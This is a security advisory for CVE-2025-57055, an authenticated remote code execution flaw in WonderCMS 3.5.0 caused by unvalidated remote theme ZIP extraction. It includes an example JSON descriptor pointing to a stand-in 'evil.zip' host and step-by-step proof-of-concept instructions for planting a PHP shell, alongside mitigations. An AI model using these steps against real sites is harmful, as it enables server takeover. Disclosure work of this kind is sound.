# CVE-2025-57055: Authenticated Remote Code Execution in WonderCMS 3.5.0

## Vulnerability Mechanics

An authenticated Remote Code Execution (RCE) vulnerability exists in WonderCMS v3.5.0.

The issue stems from how the application handles **remote theme/module installations** via JSON descriptors. When an admin submits a remote JSON file referencing a ZIP archive, its contents are extracted to a web-accessible directory (e.g., `/themes/`). If the ZIP contains a PHP file, that file becomes accessible over the web and may be executed.

This behavior introduces RCE risk due to:

- Lack of validation or sanitization on ZIP contents.
- No restriction on file types extracted from remote sources.
- Web-accessibility of theme/plugin directories.

**Note:** Admin authentication is required, but default installations expose the admin password publicly (on the homepage), use password-only login, and do not enforce strong auth controls.

## Acceptance criteria for remote module/theme descriptors

WonderCMS will accept and attempt to install remote modules/themes if the submitted JSON descriptor matches the expected `wcms-modules.json` format. A descriptor that passes the format check (and points to a ZIP archive) will be fetched and its archive contents extracted into a web-accessible directory (e.g., `/themes/<name>/`) without further validation of file types.

**Example descriptor :**
```json
{
  "themes": {
    "SSRF": {
      "name": "FAKE",
      "repo": "https://example.com/",
      "zip": "https://example.com/evil.zip",
      "summary": "test",
      "version": "1.0.0",
      "image": "https://example.com/fake.png"
    }
  }
}
```

### Proof of Concept (PoC)
**Warning: Do not run on production systems. Only use authorized test environments.**
1. Obtain the admin password from the publicly exposed homepage of a default WonderCMS installation.

2. Log in to the admin panel.

3. Navigate to the theme installation section.

4. Provide the URL to a malicious JSON descriptor (e.g., hosted on an attacker-controlled server).

5. Initiate installation. The server will:

- Fetch the descriptor.
- Download the specified ZIP archive.

6. Install the downloaded malicious theme.

7. Access the extracted PHP shell (e.g., http://target.com/themes/<Theme_Name>/shell.php) to execute arbitrary commands.

(**Note:** Only perform these steps in a controlled test environment. Exploiting this vulnerability on live systems without authorization is illegal.)




## Vendor Response

- The vulnerability was reported to WonderCMS maintainers in July 2025.

- The maintainers acknowledged the report but noted that, in their view, this behavior is acceptable for administrators.

## Mitigation Guidance

To reduce exposure:

- **Restrict remote installation capabilities** to trusted sources (e.g., GitHub only).
- **Validate and sanitize ZIP contents** before extracting.
- **Harden authentication**:
  - Hide admin password post-installation.
  - Enforce username/password login.
  - Enable multi-factor authentication (if available).
- Prevent access to executable files inside `themes/` or `plugins/` via server configuration.

## References

- [WonderCMS GitHub](https://github.com/WonderCMS/wondercms)
- [OWASP A05:2021 – Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)
- [CWE-434 – Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)

## Disclaimer

This information is provided for defensive security research and educational purposes. Always get proper authorization before testing or disclosing vulnerabilities.
